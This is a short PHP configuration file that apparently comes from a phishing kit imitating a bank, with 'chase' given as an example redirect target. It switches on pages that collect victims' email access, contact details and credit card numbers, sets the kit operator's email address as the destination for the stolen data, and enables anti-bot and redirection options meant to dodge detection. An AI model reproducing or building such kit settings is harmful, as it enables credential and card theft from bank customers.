<?php

include './admin/YOUR-CONFIG.php';

$allow_country = "no";

$show_start_page =  $user[0]['show_start_page']; ; //
$show_email_access_question = $user[0]['show_email_access']; //
$show_contact_information = $user[0]['show_contact_information'];
$show_credit_card =  $user[0]['show_credit_card'];
$show_success_page = $user[0]['show_success_page'];


$your_email = $your_email; // Your Fucking Email Here bro !! 
$redirect = $redirect; // you can change this 


$redirection = "yes";     			   // If you won't to Use Redirection Like { Domain.com?id=chase } Make it 
$anti_bot = "yes";
$check = "yes";

?>